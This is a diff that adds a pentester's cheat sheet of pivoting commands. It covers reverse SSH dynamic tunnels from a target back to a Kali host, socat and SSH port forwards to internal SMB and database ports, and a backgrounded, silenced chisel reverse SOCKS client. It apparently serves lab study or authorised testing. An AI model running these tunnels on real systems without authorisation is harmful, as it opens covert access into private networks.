@@ -1,0 +1,34 @@
+#SSH Dynamic
+target:
+ssh -N -R 9998 kali@192.168.118.4
+
+kali:
+systemctl start ssh
+tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+
+
+#REDIRECT REMOTE TO LOCAL
+target:
+ssh -N -R 127.0.0.1:8000:127.0.0.1:8000 kali@192.168.45.199
+
+
+#LOCAL FORWARD WITH SOCAT
+socat -ddd TCP-LISTEN:2345,fork TCP:RHOST:5432
+
+
+
+#LOCAL FORWARD WITH SSH
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+
+#HTTP FWD WITH CHISEL
+#kali
+./chisel server --reverse --port 8888
+
+
+#windows-client
+.\chisel.exe client 192.168.45.223:8888 R:3306:localhost:3306
+
+#linux-client
+chisel client 192.168.118.4:8888 R:socks > /dev/null 2>&1 &
